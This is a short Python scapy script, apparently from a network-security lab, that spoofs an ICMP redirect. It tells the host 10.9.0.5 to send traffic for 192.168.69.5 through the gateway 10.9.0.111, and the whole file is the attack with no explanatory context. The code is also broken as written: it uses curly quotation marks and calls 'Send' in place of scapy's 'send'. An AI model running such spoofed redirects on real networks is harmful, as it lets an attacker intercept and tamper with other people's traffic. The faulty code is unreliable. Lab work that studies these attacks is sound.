#!/usr/bin/python3
from scapy.all import *

# default ip addresses
ip = IP(src=”10.9.0.11”, dst=”10.9.0.5”)
icmp = ICMP(type=5, code=1)
icmp.gw = “10.9.0.111”
#triggering packet
ip2 = IP(src=”10.9.0.5”, dst=”192.168.69.5”)

# Send the malicious redirect
Send(ip/icmp/ip2/ICMP())
